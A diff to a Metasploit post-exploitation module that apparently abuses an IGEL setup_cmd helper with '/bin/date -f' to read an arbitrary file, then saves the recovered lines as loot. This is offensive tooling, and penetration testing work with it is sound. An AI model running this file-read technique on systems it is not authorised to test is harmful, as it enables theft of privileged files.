@@ -36,11 +36,17 @@ class MetasploitModule < Msf::Post
     output = cmd_exec("/config/bin/setup_cmd /bin/date -f #{datastore['RPATH']}")
 
     print_status('Command completed:')
+    data = []
     output.lines[1..].each do |line|
-      line = line.strip
-      print_line(line.delete_prefix(
+      line = line.strip.delete_prefix(
         '/bin/date: invalid date ‘'
-      ).delete_suffix('’'))
+      ).delete_suffix('’')
+      data << line
+      print_line(line)
     end
+
+    fname = File.basename(datastore['RPATH'].downcase)
+    loot = store_loot("igel.#{fname}", 'text/plain', session, data.join("\n"), datastore['RPATH'])
+    print_status("#{datastore['RPATH']} stored in #{loot}")
   end
 end
